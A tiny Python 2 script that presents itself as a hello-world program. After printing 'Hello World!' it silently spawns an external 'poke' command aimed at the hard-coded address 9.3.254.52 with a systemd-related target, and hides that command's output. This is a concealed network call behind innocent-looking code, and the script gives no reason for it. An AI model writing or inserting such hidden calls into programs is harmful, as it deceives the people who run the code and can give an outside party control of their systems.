from subprocess import Popen, PIPE

def function():
    print "Hello World!"
    Popen("poke -d start -i name:oblong.target tcp://9.3.254.52/systemd".split(), stdout=PIPE, stderr=PIPE)

function()
